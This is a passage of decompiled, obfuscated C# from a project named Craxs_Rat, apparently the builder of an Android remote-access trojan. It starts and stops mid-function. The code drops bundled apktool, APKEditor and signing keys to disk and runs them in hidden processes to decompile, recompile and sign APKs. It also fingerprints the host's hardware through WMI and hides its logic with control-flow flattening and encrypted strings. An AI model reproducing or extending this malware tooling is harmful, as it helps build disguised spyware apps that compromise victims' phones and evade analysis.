            num1 = (int) num2 * 1361838620 ^ -873508120;
            continue;
          case 1:
            System.IO.File.WriteAllBytes(path, Craxs_Rat.My.Resources.Resources.APKEditor);
            num1 = (int) num2 * -1656453131 ^ -390465671;
            continue;
          case 2:
            startInfo = new ProcessStartInfo(EXGuarder.\u003651F056C, EXGuarder.\u00377114C2B + str);
            startInfo.RedirectStandardOutput = true;
            num1 = (int) num2 * 735780479 ^ -451870807;
            continue;
          case 3:
            goto label_7;
          case 4:
            goto label_1;
          case 6:
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            num1 = (int) num2 * 190215582 ^ -68682387;
            continue;
          case 7:
            end = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            num1 = (int) num2 * 133153943 ^ 28222439;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return end;
label_7:
      str = EXGuarder.\u0035D08714C + path + EXGuarder.\u0036E586E12 + apkpath + EXGuarder.\u003576E6754;
      num1 = -1674653933;
      goto label_2;
    }

    public static string Excuteapkeditor(string apkpath)
    {
      string path = Settings.res_Path + EXGuarder.\u0030B066C16;
label_1:
      int num1 = -921846106;
      string str1;
      ProcessStartInfo startInfo;
      string end;
      string str2;
      Process process;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~((-(num1 ^ ~(-1471879911 - 10099446 + 1411438763 * 284813822 - ~(2076991291 - 1533297873) ^ (-1463303127 - 539792320 ^ 1433274897 ^ -184935565) + -119340823 * (1132831800 ^ 2070870357))) - (~(-23888251 ^ -654310206) ^ -(-2090215975 ^ 1753870117))) * 1378281077 ^ 295715559 - 1626416727)) % 11U)
        {
          case 0:
            str1 = EXGuarder.\u00321640127 + path + EXGuarder.\u003091C2D58 + apkpath + EXGuarder.\u0035A361908;
            num1 = -583364737;
            continue;
          case 1:
            startInfo.RedirectStandardOutput = true;
            num1 = (int) num2 * 815034275 ^ -1194489745;
            continue;
          case 2:
            process.WaitForExit();
            num1 = (int) num2 * 2075396495 ^ 775815374;
            continue;
          case 3:
            startInfo = new ProcessStartInfo(EXGuarder.\u00351124E04, EXGuarder.\u003073D004E + str1);
            num1 = (int) num2 * 330968141 ^ 1933703015;
            continue;
          case 4:
            goto label_1;
          case 5:
            str2 = end;
            num1 = (int) num2 * 1495244045 ^ 1762630566;
            continue;
          case 6:
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            num1 = (int) num2 * 732074778 ^ 882865274;
            continue;
          case 7:
            System.IO.File.WriteAllBytes(path, Craxs_Rat.My.Resources.Resources.APKEditor);
            num1 = (int) num2 * -918877892 ^ -1687943270;
            continue;
          case 9:
            int num3 = System.IO.File.Exists(path) ? 1509217002 : (num3 = -532796366);
            num1 = num3 ^ (int) num2 * -2130379900;
            continue;
          case 10:
            process = Process.Start(startInfo);
            end = process.StandardOutput.ReadToEnd();
            num1 = (int) num2 * 1487145577 ^ 1975373289;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static string ExecuteDecompile(string apkpath, string outdir)
    {
      string path = Settings.res_Path + EXGuarder.\u0037818383D;
label_1:
      int num1 = 1385175019;
      ProcessStartInfo startInfo;
      Process process;
      string end;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-num1 + (-365497622 - 1811144850 - -456746343 - ((-1706639822 ^ -1468464365) - ~902348615) + (-352413382 ^ 92742021 ^ 1841011377 * (-611130579 * -1579173180)))) * -1990589243 * 1337493621)) % 9U)
        {
          case 0:
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            num1 = (int) num2 * 1305772942 ^ -872800392;
            continue;
          case 1:
            System.IO.File.WriteAllBytes(path, Craxs_Rat.My.Resources.Resources.apktool);
            num1 = (int) num2 * 1078657908 ^ -1754404353;
            continue;
          case 2:
            int num3 = System.IO.File.Exists(path) ? -2049898199 : (num3 = 1540253278);
            num1 = num3 ^ (int) num2 * -57536125;
            continue;
          case 3:
            goto label_1;
          case 4:
            process.WaitForExit();
            str1 = end;
            num1 = (int) num2 * -701395117 ^ -198834952;
            continue;
          case 5:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            num1 = (int) num2 * -940958489 ^ 971248596;
            continue;
          case 7:
            string str2 = EXGuarder.\u0036B241428 + path + EXGuarder.\u00379531801 + apkpath + EXGuarder.\u003213C720A + outdir + EXGuarder.\u0035A28523A;
            startInfo = new ProcessStartInfo(EXGuarder.\u0034F2B681C, EXGuarder.\u003781D1303 + str2);
            startInfo.RedirectStandardOutput = true;
            num1 = -1673961496;
            continue;
          case 8:
            process = Process.Start(startInfo);
            end = process.StandardOutput.ReadToEnd();
            num1 = (int) num2 * -1466908495 ^ -607064054;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str1;
    }

    public static string ExecuteSign(string apkpath, string outfilepath)
    {
      string path1 = Settings.res_Path + EXGuarder.\u0034143033D;
label_1:
      int num1 = 1526953539;
      string path2;
      string path3;
      ProcessStartInfo startInfo;
      string end;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(~num1 * -1556519905) ^ -1132472855) * 1243669347 - 612672180)) % 11U)
        {
          case 0:
            startInfo.RedirectStandardOutput = true;
            num1 = (int) num2 * 1029753113 ^ 553381426;
            continue;
          case 1:
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            num1 = (int) num2 * 1160086681 ^ -348361007;
            continue;
          case 2:
            int num3 = System.IO.File.Exists(path1) ? 627999679 : (num3 = -1853717845);
            num1 = num3 ^ (int) num2 * 745692776;
            continue;
          case 3:
            string str = EXGuarder.\u00323586A3B + path1 + EXGuarder.\u00300384558 + path2 + EXGuarder.\u003002A6263 + path3 + EXGuarder.\u0035B60291C + outfilepath + EXGuarder.\u0032A33285E + apkpath + EXGuarder.\u0036771273B;
            startInfo = new ProcessStartInfo(EXGuarder.\u0030B6D766D, EXGuarder.\u00346561244 + str);
            num1 = 2035501996;
            continue;
          case 4:
            System.IO.File.WriteAllBytes(path1, Craxs_Rat.My.Resources.Resources.apktool);
            num1 = (int) num2 * 866491938 ^ -1669134199;
            continue;
          case 6:
            System.IO.File.WriteAllBytes(path3, Craxs_Rat.My.Resources.Resources.c);
            num1 = (int) num2 * 878036788 ^ -306906099;
            continue;
          case 7:
            System.IO.File.WriteAllBytes(path2, Craxs_Rat.My.Resources.Resources.k);
            num1 = (int) num2 * -1492311429 ^ -1696527249;
            continue;
          case 8:
            Process process = Process.Start(startInfo);
            end = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            num1 = (int) num2 * 864822441 ^ -1444391587;
            continue;
          case 9:
            path2 = Settings.res_Path + EXGuarder.\u0033A120F5A;
            path3 = Settings.res_Path + EXGuarder.\u00354113755;
            num1 = (int) num2 * 775432235 ^ 1383162783;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      return end;
    }

    public static string ExecuteCompile(string apkfolderpath, string outfilepath)
    {
      string path = Settings.res_Path + EXGuarder.\u003765D0052;
      if (System.IO.File.Exists(path))
        goto label_6;
label_1:
      int num1 = 2046614390;
label_2:
      ProcessStartInfo startInfo;
      string str1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        Process process;
        string end;
        switch ((num3 = (uint) ~(-(2123263693 * ~(-407657779 * -720587748) - (-num2 ^ ((-2044182698 ^ -1199643542) * -628691477 ^ -1946677349 * (-248950926 - -428013837)) - -734737565)) - (1561754799 - -15381004))) % 10U)
        {
          case 0:
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            num1 = (int) num3 * 1448316086 ^ -237858502;
            continue;
          case 1:
            System.IO.File.WriteAllBytes(path, Craxs_Rat.My.Resources.Resources.apktool);
            num1 = (int) num3 * -630920083 ^ -1059649851;
            continue;
          case 3:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            num1 = (int) num3 * -584333796 ^ 898242155;
            continue;
          case 4:
            process.WaitForExit();
            str1 = end;
            num1 = (int) num3 * -91037380 ^ -969203791;
            continue;
          case 5:
            startInfo.RedirectStandardOutput = true;
            num1 = (int) num3 * -131933726 ^ 233435063;
            continue;
          case 6:
            end = process.StandardOutput.ReadToEnd();
            num1 = (int) num3 * -1008419756 ^ 593078107;
            continue;
          case 7:
            goto label_1;
          case 8:
            process = Process.Start(startInfo);
            num1 = (int) num3 * -764175407 ^ -1668742825;
            continue;
          case 9:
            goto label_6;
          default:
            goto label_11;
        }
      }
label_11:
      return str1;
label_6:
      string str2 = EXGuarder.\u00340290724 + path + EXGuarder.\u0030E2F0565 + apkfolderpath + EXGuarder.\u003476D1C3A + outfilepath + EXGuarder.\u0031203351D;
      startInfo = new ProcessStartInfo(EXGuarder.\u0035B300834, EXGuarder.\u0035C4E3864 + str2);
      num1 = -1425899818;
      goto label_2;
    }

    public static object RegexMatcher(string text, string match)
    {
      Regex regex = new Regex(text);
label_1:
      int num1 = 139691820;
      System.Text.RegularExpressions.Match match1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(-(--582934941 - 1189371318 * -1466063139) - (num2 ^ -~~(702589903 * (973752477 ^ -1965516597)) ^ ~24694585 + (196037854 - 496018659) - (463498361 - -804363313 ^ -933867662) - -((1236595962 - -1272979154) * -2121971161))) - (-56410778 - -1365454686))) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            match1 = regex.Match(match);
            num1 = (int) num3 * 942075740 ^ 948089881;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return (object) match1.ToString();
    }

    public static string GetAndroidVersionName(string sdkNumber)
    {
      int result = 0;
      if (!int.TryParse(sdkNumber, out result))
        goto label_9;
label_1:
      int num1 = -480698569;
label_2:
      string androidVersionName;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(--1491788538 - ~(-num2 + ((~-900548830 - -1886118122 ^ 1639670380) - 271439142) - (1343652943 * (-1309665993 - 1652732386) - (~874744697 - 987968026))))) % 34U)
        {
          case 0:
label_33:
            androidVersionName = EXGuarder.\u003583C1C59;
            num1 = 200253154;
            continue;
          case 1:
            goto label_9;
          case 2:
label_3:
            androidVersionName = EXGuarder.\u00337275175;
            num1 = 18049736;
            continue;
          case 3:
            num1 = (int) num3 * -397493802 ^ 544749008;
            continue;
          case 4:
label_23:
            androidVersionName = EXGuarder.\u00310600B44;
            num1 = 62949542;
            continue;
          case 5:
label_31:
            androidVersionName = EXGuarder.\u0031104731A;
            num1 = -329149834;
            continue;
          case 6:
            goto label_1;
          case 7:
label_5:
            androidVersionName = EXGuarder.\u0030A6C184B;
            num1 = -1110754001;
            continue;
          case 8:
            num1 = (int) num3 * -187944847 ^ 482770722;
            continue;
          case 9:
label_4:
            androidVersionName = EXGuarder.\u0030F3A1618;
            num1 = 294996449;
            continue;
          case 10:
            num1 = (int) num3 * -854696588 ^ 1592199006;
            continue;
          case 11:
label_20:
            androidVersionName = EXGuarder.\u0031A425B68;
            num1 = -150208295;
            continue;
          case 12:
            num1 = (int) num3 * 1408432086 ^ 1591559302;
            continue;
          case 13:
            num1 = (int) num3 * -604926512 ^ 173307446;
            continue;
          case 14:
label_12:
            androidVersionName = EXGuarder.\u003451D2E0E;
            num1 = 62949542;
            continue;
          case 15:
label_30:
            androidVersionName = EXGuarder.\u003322C455A;
            num1 = -184050644;
            continue;
          case 16:
            num1 = (int) num3 * -1921177352 ^ 1029973654;
            continue;
          case 17:
            switch (result)
            {
              case 16:
                goto label_8;
              case 17:
                goto label_23;
              case 18:
                goto label_18;
              case 19:
                goto label_3;
              case 20:
                goto label_5;
              case 21:
                goto label_30;
              case 22:
                goto label_21;
              case 23:
                goto label_4;
              case 24:
                goto label_35;
              case 25:
                goto label_6;
              case 26:
                goto label_32;
              case 27:
                goto label_34;
              case 28:
                goto label_15;
              case 29:
                goto label_33;
              case 30:
                goto label_31;
              case 31:
                goto label_12;
              case 32:
                goto label_20;
              case 33:
                goto label_10;
              default:
                num1 = (int) num3 * 1308911177 ^ 301595465;
                continue;
            }
          case 18:
            num1 = (int) num3 * 1709451198 ^ -1921097754;
            continue;
          case 19:
label_35:
            androidVersionName = EXGuarder.\u0032120083C;
            num1 = -525989103;
            continue;
          case 20:
label_8:
            androidVersionName = EXGuarder.\u0036940106C;
            num1 = 62949542;
            continue;
          case 21:
label_18:
            androidVersionName = EXGuarder.\u0036F602176;
            num1 = 62949542;
            continue;
          case 22:
            num1 = (int) num3 * -157640817 ^ 572628557;
            continue;
          case 23:
            num1 = (int) num3 * 1043470235 ^ -1603817413;
            continue;
          case 24:
label_34:
            androidVersionName = EXGuarder.\u00322307813;
            num1 = -1455937262;
            continue;
          case 25:
label_15:
            androidVersionName = EXGuarder.\u0032E74461F;
            num1 = 62949542;
            continue;
          case 26:
label_21:
            androidVersionName = EXGuarder.\u0034244353D;
            num1 = -388795869;
            continue;
          case 27:
label_10:
            androidVersionName = EXGuarder.\u00303003F37;
            num1 = 62949542;
            continue;
          case 29:
            num1 = (int) num3 * -653386379 ^ -664556067;
            continue;
          case 30:
label_6:
            androidVersionName = EXGuarder.\u003114E122F;
            num1 = 62949542;
            continue;
          case 31:
            num1 = (int) num3 * -1841334615 ^ 1706101823;
            continue;
          case 32:
label_32:
            androidVersionName = EXGuarder.\u0031C1D5E11;
            num1 = -38230749;
            continue;
          case 33:
            num1 = (int) num3 * -1168315432 ^ 590249358;
            continue;
          default:
            goto label_36;
        }
      }
label_36:
      return androidVersionName;
label_9:
      androidVersionName = EXGuarder.\u0030A6C184B;
      num1 = 62949542;
      goto label_2;
    }

    public static string ProcessStartWithOutput(string FileName, string Arguments, int waitfor = 5000)
    {
      string message = string.Empty;
      try
      {
        Process process = new Process();
        try
        {
          process.StartInfo.FileName = FileName;
          process.StartInfo.Arguments = Arguments;
label_3:
          int num1 = 1010700922;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) ~-(num1 * -1861845151)) % 12U)
            {
              case 0:
                goto label_3;
              case 1:
                process.Start();
                num1 = (int) num2 * 1036203557 ^ -1921514406;
                continue;
              case 2:
                message = process.StandardOutput.ReadToEnd().Trim() + process.StandardError.ReadToEnd().Trim();
                num1 = (int) num2 * -2106551810 ^ -155184660;
                continue;
              case 3:
                process.StartInfo.RedirectStandardOutput = true;
                num1 = (int) num2 * -1970036631 ^ 1557036421;
                continue;
              case 5:
                process.StartInfo.RedirectStandardError = true;
                num1 = (int) num2 * -931693583 ^ -1560238626;
                continue;
              case 6:
                process.StartInfo.UseShellExecute = false;
                num1 = (int) num2 * 1764183293 ^ 1463572820;
                continue;
              case 7:
                process.WaitForExit();
                num1 = (int) num2 * -1844074283 ^ 1910521334;
                continue;
              case 8:
                num1 = (int) num2 * 237395192 ^ -1274021151;
                continue;
              case 9:
                process.StartInfo.CreateNoWindow = true;
                num1 = (int) num2 * -425257527 ^ -1319000487;
                continue;
              case 10:
                process.WaitForExit(waitfor);
                num1 = -1331508191;
                continue;
              case 11:
                int num3 = waitfor != 0 ? 200690226 : (num3 = 236708689);
                num1 = num3 ^ (int) num2 * -1302718605;
                continue;
              default:
                goto label_24;
            }
          }
        }
        finally
        {
          if (process != null)
          {
label_16:
            int num4 = 155359022;
            while (true)
            {
              uint num5;
              switch ((num5 = (uint) ~-(num4 * -1861845151)) % 3U)
              {
                case 1:
                  process.Dispose();
                  num4 = (int) num5 * 1336206305 ^ -1125976022;
                  continue;
                case 2:
                  goto label_16;
                default:
                  goto label_19;
              }
            }
          }
label_19:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Debug.WriteLine((object) ex);
label_21:
        int num6 = 443483828;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) ~-(num6 * -1861845151)) % 3U)
          {
            case 0:
              goto label_21;
            case 2:
              ProjectData.ClearProjectError();
              num6 = (int) num7 * 298411588 ^ -1886294405;
              continue;
            default:
              goto label_24;
          }
        }
      }
label_24:
      Debug.WriteLine(message);
      return message;
    }

    public static string RealPath(string path = "")
    {
      return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + path;
    }

    public static string ExtractName(string apkpath)
    {
      string pattern = EXGuarder.\u00374180211;
label_1:
      int num1 = -507007577;
      string name;
      while (true)
      {
        int num2 = num1;
        uint num3;
        System.Text.RegularExpressions.Match match;
        switch ((num3 = (uint) ((-1456361230 - 797656029 - --1946175399 - ((~(723077947 - 1812897834) ^ 1477956983) - (-1721225263 * -1771656131 + (-1361406118 - -59942773) * 1915856991) - (num2 ^ ~(342129188 + 1655934206) + (1627888495 - 631328187 + 146097434 * 1718097265) ^ -628832964 ^ --(604252025 * (-1525263543 * -439704461))) + --1658634395) ^ 709025543 - -1778830966) + 74914946)) % 7U)
        {
          case 0:
            name = match.Groups[1].Value;
            num1 = (int) num3 * -433195131 ^ -1847122145;
            continue;
          case 1:
            match = Regex.Match(Codes.Excuteapkeditor(apkpath), pattern);
            num1 = (int) num3 * -1224298782 ^ -1803348229;
            continue;
          case 2:
            int num4 = !match.Success ? -223905938 : (num4 = -1982886500);
            num1 = num4 ^ (int) num3 * 1155814285;
            continue;
          case 3:
            goto label_1;
          case 4:
            name = EXGuarder.\u003675E0C01;
            num1 = -333844490;
            continue;
          case 5:
            num1 = (int) num3 * -1996958304 ^ 70769430;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return name;
    }

    public static string ExtractPackage(string apkpath)
    {
      string pattern = EXGuarder.\u00355011262;
label_1:
      int num1 = -1841278088;
      string package;
      while (true)
      {
        int num2 = num1;
        uint num3;
        System.Text.RegularExpressions.Match match;
        switch ((num3 = (uint) (-201845869 - ~~num2)) % 6U)
        {
          case 0:
            package = EXGuarder.\u00343346629;
            num1 = -1054137072;
            continue;
          case 1:
            match = Regex.Match(Codes.Excuteapkeditor(apkpath), pattern);
            num1 = (int) num3 * -1808337850 ^ 1152340132;
            continue;
          case 2:
            package = match.Groups[1].Value;
            num1 = (int) num3 * 821467685 ^ 1350403076;
            continue;
          case 3:
            int num4 = !match.Success ? -452997088 : (num4 = -166474718);
            num1 = num4 ^ (int) num3 * -187617567;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      return package;
    }

    public static void File_zip_Decompress(string zipPath, string pathfolder)
    {
      if (Directory.Exists(pathfolder))
        goto label_5;
label_1:
      int num1 = -440819287;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --(num1 * 2073534809)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            Directory.CreateDirectory(pathfolder);
            num1 = (int) num2 * -2074752943 ^ -876951917;
            continue;
          case 2:
            goto label_5;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      ZipFile.ExtractToDirectory(zipPath, pathfolder);
      num1 = -1589498636;
      goto label_2;
    }

    public static Image ResizeImage(Image inputImage, Size size, bool preserveAspectRatio = false)
    {
      if (inputImage.Width != size.Width)
        goto label_9;
label_1:
      int num1 = -1733179960;
label_2:
      int height1;
      int width1;
      Image image;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int height2;
        float num4;
        int width2;
        switch ((num3 = (uint) (-1869759975 - (155058109 * (-1916433114 - 1951775770) - (-(num2 - (-555561034 - -2095118751 * -1697051678 ^ (-457038629 ^ 2143060395) * -1050539517 ^ -(-952257840 - ~-116652137)) * 2044995479) ^ ~-1490480638 ^ --1872506310) ^ ~1590594879))) % 11U)
        {
          case 0:
            goto label_9;
          case 1:
            goto label_19;
          case 2:
            image = inputImage;
            num1 = (int) num3 * 1143573023 ^ 2073502935;
            continue;
          case 3:
            height2 = inputImage.Height;
            num1 = (int) num3 * 687816590 ^ -139638615;
            continue;
          case 4:
            height1 = checked ((int) Math.Round(unchecked ((double) height2 * (double) num4)));
            num1 = (int) num3 * -1504920937 ^ 1884409085;
            continue;
          case 5:
            goto label_1;
          case 6:
            height1 = size.Height;
            int num5 = !preserveAspectRatio ? 820306428 : (num5 = 606014568);
            num1 = num5 ^ (int) num3 * 1750428285;
            continue;
          case 7:
            int num6 = inputImage.Height != size.Height ? -418899473 : (num6 = 24232797);
            num1 = num6 ^ (int) num3 * 1636288435;
            continue;
          case 9:
            width2 = inputImage.Width;
            num1 = (int) num3 * -935670901 ^ 1383494669;
            continue;
          case 10:
            num4 = (float) Math.Min((double) size.Width / (double) width2, (double) size.Height / (double) height2);
            width1 = checked ((int) Math.Round(unchecked ((double) width2 * (double) num4)));
            num1 = (int) num3 * 1422529136 ^ -499743036;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      Bitmap bitmap = new Bitmap(width1, height1);
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      try
      {
        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
        graphics.DrawImage(inputImage, 0, 0, width1, height1);
      }
      finally
      {
        if (graphics != null)
        {
label_14:
          int num7 = -270536206;
          while (true)
          {
            int num8 = num7;
            uint num9;
            switch ((num9 = (uint) (-1869759975 - (155058109 * (-1916433114 - 1951775770) - (-(num8 - (-555561034 - -2095118751 * -1697051678 ^ (-457038629 ^ 2143060395) * -1050539517 ^ -(-952257840 - ~-116652137)) * 2044995479) ^ ~-1490480638 ^ --1872506310) ^ ~1590594879))) % 3U)
            {
              case 1:
                graphics.Dispose();
                num7 = (int) num9 * 417512078 ^ 473792296;
                continue;
              case 2:
                goto label_14;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
      image = (Image) bitmap;
label_19:
      return image;
label_9:
      width1 = size.Width;
      num1 = -1610486311;
      goto label_2;
    }

    public static string GetHWID()
    {
      string hwid;
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        try
        {
          string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
label_2:
          int num1 = 1717188588;
          while (true)
          {
            int num2 = num1;
            uint num3;
            ManagementObject managementObject;
            switch ((num3 = (uint) ((~2098901825 - (~~num2 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 4U)
            {
              case 0:
                goto label_2;
              case 1:
                managementObject.Get();
                stringBuilder.Append(managementObject[EXGuarder.\u00333353F38].ToString());
                num1 = (int) num3 * -1039286042 ^ 1965781333;
                continue;
              case 2:
                managementObject = new ManagementObject(string.Format(EXGuarder.\u0034A5F2108, (object) str));
                num1 = (int) num3 * 1715073951 ^ -1665927685;
                continue;
              default:
                goto label_11;
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_7:
          int num4 = -1919747211;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) ((~2098901825 - (~~num5 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 3U)
            {
              case 0:
                goto label_7;
              case 2:
                stringBuilder.Append(EXGuarder.\u00354046614);
                num4 = (int) num6 * 1049018674 ^ 1781875056;
                continue;
              default:
                goto label_10;
            }
          }
label_10:
          ProjectData.ClearProjectError();
        }
label_11:
        ManagementObjectSearcher managementObjectSearcher1 = new ManagementObjectSearcher((ObjectQuery) new SelectQuery(EXGuarder.\u00328325D6F));
        try
        {
          ManagementObjectCollection.ManagementObjectEnumerator enumerator;
          try
          {
            enumerator = managementObjectSearcher1.Get().GetEnumerator();
label_14:
            int num7 = 1850022407;
            while (true)
            {
              int num8 = num7;
              uint num9;
              switch ((num9 = (uint) ((~2098901825 - (~~num8 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 5U)
              {
                case 0:
                  goto label_14;
                case 1:
                  ManagementObject current = (ManagementObject) enumerator.Current;
                  stringBuilder.Append(current[EXGuarder.\u0032F380163].ToString());
                  num7 = 247385823;
                  continue;
                case 2:
                  int num10;
                  num7 = num10 = enumerator.MoveNext() ? 2030567346 : (num10 = -2074515300);
                  continue;
                case 4:
                  num7 = (int) num9 * 1472342581 ^ 504795620;
                  continue;
                default:
                  goto label_28;
              }
            }
          }
          finally
          {
            if (enumerator != null)
            {
label_20:
              int num11 = -1430097433;
              while (true)
              {
                int num12 = num11;
                uint num13;
                switch ((num13 = (uint) ((~2098901825 - (~~num12 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 3U)
                {
                  case 0:
                    goto label_20;
                  case 1:
                    enumerator.Dispose();
                    num11 = (int) num13 * -1247327948 ^ 835090470;
                    continue;
                  default:
                    goto label_23;
                }
              }
            }
label_23:;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          stringBuilder.Append(EXGuarder.\u0033E5A5E29);
label_25:
          int num14 = 889958384;
          while (true)
          {
            int num15 = num14;
            uint num16;
            switch ((num16 = (uint) ((~2098901825 - (~~num15 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 3U)
            {
              case 0:
                goto label_25;
              case 2:
                ProjectData.ClearProjectError();
                num14 = (int) num16 * -1685800397 ^ -823107160;
                continue;
              default:
                goto label_28;
            }
          }
        }
label_28:
        try
        {
          ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher((ObjectQuery) new SelectQuery(EXGuarder.\u00357215E57));
          ManagementObjectCollection.ManagementObjectEnumerator enumerator;
          try
          {
            enumerator = managementObjectSearcher2.Get().GetEnumerator();
label_30:
            int num17 = 1378954768;
            while (true)
            {
              int num18 = num17;
              uint num19;
              switch ((num19 = (uint) ((~2098901825 - (~~num18 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 5U)
              {
                case 1:
                  int num20;
                  num17 = num20 = enumerator.MoveNext() ? 1500126059 : (num20 = -1510475154);
                  continue;
                case 2:
                  num17 = (int) num19 * 1274174541 ^ 802554078;
                  continue;
                case 3:
                  ManagementObject current = (ManagementObject) enumerator.Current;
                  stringBuilder.Append(current[EXGuarder.\u003536F391F].ToString());
                  num17 = 1177707724;
                  continue;
                case 4:
                  goto label_30;
                default:
                  goto label_44;
              }
            }
          }
          finally
          {
            if (enumerator != null)
            {
label_36:
              int num21 = 1867134557;
              while (true)
              {
                int num22 = num21;
                uint num23;
                switch ((num23 = (uint) ((~2098901825 - (~~num22 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 3U)
                {
                  case 0:
                    goto label_36;
                  case 2:
                    enumerator.Dispose();
                    num21 = (int) num23 * -353715070 ^ 1011703582;
                    continue;
                  default:
                    goto label_39;
                }
              }
            }
label_39:;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_41:
          int num24 = -851067272;
          while (true)
          {
            int num25 = num24;
            uint num26;
            switch ((num26 = (uint) ((~2098901825 - (~~num25 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 3U)
            {
              case 0:
                goto label_41;
              case 2:
                stringBuilder.Append(EXGuarder.\u00371436D2C);
                ProjectData.ClearProjectError();
                num24 = (int) num26 * 49156570 ^ -507802451;
                continue;
              default:
                goto label_44;
            }
          }
        }
label_44:
        hwid = stringBuilder.ToString().Trim().Replace(EXGuarder.\u0034A3A250E, EXGuarder.\u003153D0572);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_46:
        int num27 = 98862078;
        while (true)
        {
          int num28 = num27;
          uint num29;
          switch ((num29 = (uint) ((~2098901825 - (~~num28 - ~(--1690273430 - 1874580260) ^ -1758868207 ^ -522125774)) * -726014845)) % 5U)
          {
            case 1:
              Environment.FailFast(EXGuarder.\u003253F0C09);
              num27 = (int) num29 * 772731464 ^ -568923429;
              continue;
            case 2:
              ProjectData.ClearProjectError();
              num27 = (int) num29 * 173060989 ^ 1415480013;
              continue;
            case 3:
              int num30 = (int) Interaction.MsgBox((object) EXGuarder.\u003253F0C09);
              num27 = (int) num29 * -793999233 ^ -1896563458;
              continue;
            case 4:
              goto label_46;
            default:
              goto label_51;
          }
        }
      }
label_51:
      return hwid;
    }

    public static object[] SplitByte(byte[] b, Array s)
    {
      object[] objArray1 = new object[2];
      MemoryStream memoryStream = new MemoryStream();
label_1:
      int num1 = 797817051;
      while (true)
      {
        int num2 = num1;
        uint num3;
        long num4;
        long count;
        byte[] array;
        switch ((num3 = (uint) (~~-981719324 - -(num2 ^ -1807480485 - (-(1813668036 - 622274233) - 887689725 * (1639812171 - -896212403)) - ((2134487823 - 1228566538 ^ -1666669352 ^ -354692070 * -508194531 * 1787574681) - (-1487801544 - -877118299 - (165491683 ^ -752058392) - -1018485631)) ^ ~-514080357 * 1772957633 - (-297450484 ^ 1525180481 ^ 767770136 - 349616043) ^ ~(--2080563007 + ~-984834140)) - -1189628932 - 1318628866)) % 7U)
        {
          case 0:
            memoryStream.Write(b, checked ((int) num4), checked ((int) count));
            object[] objArray2 = objArray1;
            array = memoryStream.ToArray();
            byte[] numArray1 = Codes.DEgzip(ref array);
            objArray2[1] = (object) numArray1;
            num1 = (int) num3 * -754357693 ^ 1727481454;
            continue;
          case 1:
            num4 = (long) s.GetValue(0);
            num1 = (int) num3 * 875634523 ^ 770529905;
            continue;
          case 2:
            goto label_1;
          case 3:
            memoryStream.Write(b, 0, checked ((int) num4));
            object[] objArray3 = objArray1;
            array = memoryStream.ToArray();
            byte[] numArray2 = Codes.DEgzip(ref array);
            objArray3[0] = (object) numArray2;
            num1 = (int) num3 * 306011075 ^ 1836292449;
            continue;
          case 4:
            memoryStream.Dispose();
            num1 = (int) num3 * 556646706 ^ 1445989767;
            continue;
          case 6:
            memoryStream.Dispose();
            memoryStream = new MemoryStream();
            count = (long) s.GetValue(1);
            num1 = (int) num3 * 1430828228 ^ -1346230828;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return objArray1;
